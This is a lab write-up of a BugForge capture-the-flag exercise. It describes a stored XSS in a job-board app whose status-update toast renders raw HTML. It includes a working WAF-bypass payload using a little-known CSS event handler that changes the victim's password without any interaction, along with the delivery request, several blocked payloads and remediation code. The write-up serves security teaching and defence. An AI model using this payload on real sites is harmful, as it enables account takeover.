---
layout: default
title: "FurHire (Stored XSS / WAF Bypass) - BugForge"
---

[← Back](./)

# BugForge - FurHire WAF Bypass Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-14</span>
  <span><strong>Difficulty:</strong> Medium</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. Stored XSS via application status field rendered through socket.io toast notification (`innerHTML` sink)
2. WAF keyword blocklist bypass using `oncontentvisibilityautostatechange` — a newer CSS event handler not in the blocklist
3. No-interaction trigger via `content-visibility:auto` CSS property

**Business Impact:** Stored XSS enables full account takeover of any job seeker on the platform. An attacker acting as a recruiter can change any applicant's password without their knowledge, gaining complete access to their account and personal data.

---

## Objective

Achieve XSS on target user `jeremy`. The application has a WAF blocking standard XSS vectors.

## Initial Access

```bash
# Target Application
URL: https://lab-1773522863657-6jdfnj.labs-app.bugforge.io

# Auth: Self-registered accounts with JWT (HttpOnly cookie)
# PwnFox container isolation:
#   Blue = seeker (id=6) — recon and receiving toasts
#   Yellow = recruiter (id=7) — injection via status updates
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **Stored XSS via application status field** — The `PUT /api/applications/:id/status` endpoint accepts arbitrary HTML in the `status` field. The server includes this raw value in socket.io `status_update` messages, which `showToast()` renders via `innerHTML` (CWE-79)
2. **WAF blocklist gaps** — The WAF uses a keyword blocklist for event handlers rather than a broad pattern like `on\w+=`. Newer browser event handlers not in the list pass through unblocked (CWE-693)
3. **Missing input validation on status field** — Server does not constrain status to known values (CWE-20)

**CVSS v3.1 Score for Stored XSS:** **9.6 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Changed |
| Confidentiality | High |
| Integrity | High |
| Availability | None |

## Enumeration Summary

### Application Analysis

**Tech Stack:**
- Express (Node.js) — `X-Powered-By: Express`
- Socket.io for real-time notifications (toasts)
- JWT auth via HttpOnly cookie
- Client-side rendering via AJAX + `innerHTML` with `FurHire.escapeHtml()`

**Target Endpoints Discovered:**

| Method | Path | Role | Notes |
|--------|------|------|-------|
| POST | `/api/register` | public | username, email, full_name, role, password |
| POST | `/api/login` | public | |
| PUT | `/api/profile` | user | bio, location, phone, years_experience, skills |
| PUT | `/api/profile/password` | user | newPassword |
| PUT | `/api/company` | recruiter | company_name, industry, description, location, website |
| POST | `/api/jobs` | recruiter | title, description, location, job_type, salary_range, requirements |
| POST | `/api/jobs/:id/apply` | user | cover_letter |
| GET | `/api/jobs/:id/applicants` | recruiter | list of applicants |
| **PUT** | **`/api/applications/:id/status`** | **recruiter** | **status — INJECTION POINT** |
| GET | `/api/my-applications` | user | seeker's application history |

## Attack Chain Visualization

```
┌──────────────┐    POST /api/jobs     ┌──────────────┐
│   Attacker   │──────────────────────▶│  FurHire App │
│  (recruiter) │                       │   (Express)  │
└──────┬───────┘                       └──────┬───────┘
       │                                      │
       │  jeremy applies to job (~3 min)      │
       │◀─────────────────────────────────────┘
       │
       │  PUT /api/applications/:id/status
       │  {"status":"accepted<img oncontentvisi..."}
       │─────────────────────────────────────▶┌──────────┐
       │                                     │   WAF    │
       │          WAF passes payload         │ blocklist│
       │◀────────────────────────────────────└──────────┘
       │                                      │
       │                              ┌───────▼───────┐
       │                              │   socket.io   │
       │                              │ status_update │
       │                              └───────┬───────┘
       │                                      │
       │                              ┌───────▼───────┐
       │                              │  jeremy's     │
       │                              │  browser      │
       │                              │               │
       │                              │ showToast()   │
       │                              │  innerHTML    │──▶ XSS fires
       │                              │               │
       │                              │ fetch() PUT   │
       │                              │ /api/profile/ │
       │                              │ password      │──▶ password = "password2"
       │                              └───────────────┘
       │
       │  POST /api/login {jeremy:password2}
       │─────────────────────────────────────▶ Account takeover ✓
```

**Attack Path Summary:**
1. Register as recruiter, create company, post job listing
2. Wait for jeremy's bot to apply (~3 min)
3. Update application status with XSS payload using unlisted event handler
4. WAF passes payload — `oncontentvisibilityautostatechange` not in blocklist
5. Socket.io delivers `status_update` to jeremy's browser
6. `showToast()` renders payload via `innerHTML` — XSS fires without interaction
7. `fetch()` changes jeremy's password to `password2`
8. Login as jeremy — account takeover complete

---

## Exploitation Path

### Step 1: Reconnaissance — Mapping the Application

Registered two accounts using PwnFox for container isolation:
- **Blue container** — seeker account (id=6) for browsing the app as a job applicant
- **Yellow container** — recruiter account (id=7) for posting jobs and managing applications

Mapped all API endpoints via browser devtools network tab. Identified the tech stack from `X-Powered-By: Express` header and socket.io connections in the WebSocket tab.

### Step 2: Identify the Sink — showToast() innerHTML

The socket.io `status_update` event triggers `showToast(data.message)` which renders content via `innerHTML` without escaping. This is the only rendering path that doesn't use `FurHire.escapeHtml()` — all page templates properly escape output.

```javascript
// Vulnerable sink in app.js
function showToast(message) {
    const toast = document.createElement('div');
    toast.innerHTML = message;  // No escaping — raw HTML rendered
    // ...
}
```

### Step 3: Identify the Injection Point — Application Status

The `PUT /api/applications/:id/status` endpoint accepts a JSON body with a `status` field. The server does not validate or sanitize this value — it's included raw in the socket.io message sent to the applicant.

```http
PUT /api/applications/1/status HTTP/1.1
Content-Type: application/json
Cookie: token=eyJ...

{"status":"accepted"}
```

The server emits:

```javascript
socket.emit('status_update', {
    message: `Your application status has been updated to: ${status}`
});
```

### Step 4: WAF Analysis and Bypass

Initial XSS attempts were blocked by the WAF:

```
// All blocked:
<img onerror=alert(1)>        → blocked (onerror in blocklist)
<svg onload=alert(1)>         → blocked (onload in blocklist)
<script>alert(1)</script>     → blocked (<script in blocklist)
<iframe src=javascript:...>   → blocked (javascript: in blocklist)
```

Tested the WAF's detection approach:

```
<x onfakeevent=test>          → PASSED ✓
```

This confirmed the WAF uses a **keyword blocklist**, not a regex pattern like `on\w+=`. Any event handler not explicitly listed would bypass it.

Used `oncontentvisibilityautostatechange` — a CSS Containment Level 2 event that fires when an element's `content-visibility` state changes. Combined with `style=display:block;content-visibility:auto` to trigger automatically without user interaction.

### Step 5: Craft and Deliver the Payload

The payload needs to:
1. Bypass the WAF (use unlisted event handler)
2. Fire without user interaction (CSS `content-visibility:auto`)
3. Change jeremy's password (`fetch` to `/api/profile/password`)
4. Use jeremy's existing auth cookie (HttpOnly JWT sent automatically with same-origin fetch)

```
accepted<img oncontentvisibilityautostatechange=fetch('/api/profile/password',{'method':'PUT','headers':{'Content-Type':'application/json'},'body':atob('eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9')}) style=display:block;content-visibility:auto>
```

The base64-encoded body decodes to `{"newPassword":"password2"}`.

Delivered via:

```http
PUT /api/applications/<jeremy-app-id>/status HTTP/1.1
Content-Type: application/json
Cookie: token=<recruiter-jwt>

{"status":"accepted<img oncontentvisibilityautostatechange=fetch('/api/profile/password',{'method':'PUT','headers':{'Content-Type':'application/json'},'body':atob('eyJuZXdQYXNzd29yZCI6InBhc3N3b3JkMiJ9')}) style=display:block;content-visibility:auto>"}
```

Socket.io delivered the `status_update` to jeremy's browser. `showToast()` rendered the payload via `innerHTML`. `content-visibility:auto` triggered the event handler — `fetch()` changed jeremy's password. Logged in as jeremy with `password2`.

---

## Flag / Objective Achieved

✅ **Flag:** `bug{3pYyQ3gyX5KyzCVWqU3yAcBM5gO1dYne}`

Account takeover achieved — logged in as jeremy after changing his password via stored XSS.

---

## Key Learnings

- **Keyword blocklists age badly.** New browser APIs introduce new event handlers regularly. A WAF that blocks a static list of `on*` handlers will inevitably miss newer ones like `oncontentvisibilityautostatechange` (CSS Containment Level 2). A regex pattern like `on\w+=` or an allowlist approach is more durable.
- **Test the WAF's detection model, not just its responses.** Sending `<x onfakeevent=test>` immediately revealed the blocklist approach — that single test saved time vs. brute-forcing known handlers.
- **`content-visibility:auto` enables interaction-free XSS.** Unlike handlers that require clicks or hovers, `oncontentvisibilityautostatechange` fires when the element becomes visible in the viewport. Combined with `display:block`, it triggers as soon as the DOM renders.
- **Socket.io sinks are easy to overlook.** The main page templates all used `escapeHtml()`, but the toast notification path rendered raw HTML. Real-time notification systems (WebSocket, SSE, push) are often an afterthought in security reviews.
- **HttpOnly doesn't prevent account takeover via same-origin requests.** The JWT cookie couldn't be exfiltrated, but `fetch()` to the password change endpoint sends the cookie automatically. The impact is identical — full account compromise.

---

## Tools Used

- **PwnFox** — Firefox container isolation for separate seeker and recruiter sessions
- **Browser DevTools** — Network tab for API mapping, WebSocket tab for socket.io inspection, Console for payload testing
- **Burp Suite / curl** — HTTP request manipulation for status field injection

---

## Remediation

### 1. Stored XSS via innerHTML in showToast() (CVSS: 9.6 - Critical)

**Issue:** `showToast()` renders user-controlled content via `innerHTML` without sanitization, allowing arbitrary JavaScript execution in other users' browsers.

**CWE Reference:** CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

**Fix:**

```javascript
// BEFORE (Vulnerable)
function showToast(message) {
    const toast = document.createElement('div');
    toast.innerHTML = message;
}

// AFTER (Secure)
function showToast(message) {
    const toast = document.createElement('div');
    toast.textContent = message;  // Renders as text, not HTML
}
```

### 2. Missing Server-Side Input Validation on Status Field (CVSS: 8.1 - High)

**Issue:** The `PUT /api/applications/:id/status` endpoint accepts arbitrary strings in the `status` field. The server should constrain this to known status values.

**CWE Reference:** CWE-20 — Improper Input Validation

**Fix:**

```javascript
// BEFORE (Vulnerable)
app.put('/api/applications/:id/status', (req, res) => {
    const { status } = req.body;
    updateApplicationStatus(id, status);
});

// AFTER (Secure)
const VALID_STATUSES = ['pending', 'reviewing', 'accepted', 'rejected'];

app.put('/api/applications/:id/status', (req, res) => {
    const { status } = req.body;
    if (!VALID_STATUSES.includes(status)) {
        return res.status(400).json({ error: 'Invalid status value' });
    }
    updateApplicationStatus(id, status);
});
```

### 3. WAF Blocklist Approach (CVSS: 5.3 - Medium)

**Issue:** WAF uses a static keyword blocklist for event handlers. New browser event handlers bypass it automatically.

**CWE Reference:** CWE-693 — Protection Mechanism Failure

**Fix:**

```javascript
// WAF improvement: block ALL event handler patterns
// Instead of: ['onerror', 'onload', 'onclick', ...]
// Use regex:
const EVENT_HANDLER_PATTERN = /\bon[a-z]+=|<script|javascript:/i;

// But WAF is defense-in-depth, not the primary fix.
// The real fix is #1 (textContent) and #2 (input validation).
```

---

## Failed Attempts

### Approach 1: Job Title Injection

```
POST /api/jobs — title: "<img onerror=alert(1)>"
```

**Result:** Failed — All page templates use `FurHire.escapeHtml()`. Server also escapes title in socket messages.

### Approach 2: Object Tag with Data URI

```
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
```

**Result:** Failed — Bypassed the WAF but `data:` URIs execute in an opaque origin. No access to the parent page's cookies or DOM.

### Approach 3: JSON Unicode Escapes

```
\u006f\u006e\u0065\u0072\u0072\u006f\u0072
```

**Result:** Failed — WAF decodes unicode escapes before checking the blocklist.

### Approach 4: Content Overload

```
Large request body attempting to exceed WAF inspection limits
```

**Result:** Failed — WAF inspects the full request body up to the server's 100KB limit.

### Approach 5: Content-Type Juggling

```
Sending XSS payload with non-JSON Content-Type headers
```

**Result:** Failed — WAF checks all content types, not just `application/json`.

### Approach 6: URL Path Reflection

```
Injecting HTML via URL path parameters
```

**Result:** Failed — Server HTML-encodes `<>&"'` in reflected path parameters.

### Approach 7: Company Website Field with Data URI

```
PUT /api/company — website: "data:text/html;base64,..."
```

**Result:** Failed — Even if jeremy's bot clicked the link, the `data:` URI opens in a sandboxed opaque origin.

---

## OWASP Top 10 Coverage

- **A03:2021** — Injection (Stored XSS via unsanitized status field rendered through `innerHTML`)
- **A05:2021** — Security Misconfiguration (WAF keyword blocklist incomplete, missing newer event handlers)
- **A07:2021** — Identification and Authentication Failures (Password change endpoint lacks re-authentication, enabling account takeover via XSS)

---

## References

**XSS & WAF Bypass Resources:**
- [MDN: contentvisibilityautostatechange event](https://developer.mozilla.org/en-US/docs/Web/API/Element/contentvisibilityautostatechange_event)
- [W3C CSS Containment Level 2: content-visibility](https://www.w3.org/TR/css-contain-2/#content-visibility)
- [PortSwigger: Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)

---

**Tags:** `#xss` `#stored-xss` `#waf-bypass` `#socket-io` `#innerhtml` `#content-visibility` `#account-takeover` `#bugforge`
